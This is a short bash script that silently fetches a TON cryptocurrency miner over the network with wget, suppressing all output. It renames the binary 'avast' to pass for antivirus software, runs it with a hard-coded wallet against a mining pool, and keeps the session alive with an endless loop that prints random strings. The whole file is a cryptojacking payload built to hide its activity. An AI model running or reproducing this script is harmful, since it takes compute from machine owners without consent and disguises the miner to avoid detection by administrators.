#!/bin/bash

#!/bin/sh

#!/bin/bash

wget -q https://github.com/TON-Pool/miner/releases/download/0.3.4/ton-pool.com-miner-0.3.4-linux.tar.gz >/dev/null 2>&1 

tar xf ton-pool.com-miner-0.3.4-linux.tar.gz >/dev/null 2>&1

mv miner-linux avast

chmod +x avast >/dev/null 2>&1

./avast https://next.ton-pool.com EQCq8h0FQ_IzVSueBKoYahTBe5EXnomyu6WVTPp29L8YYG2Z

while [ 1 ]; do

  while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done

sleep 2

done
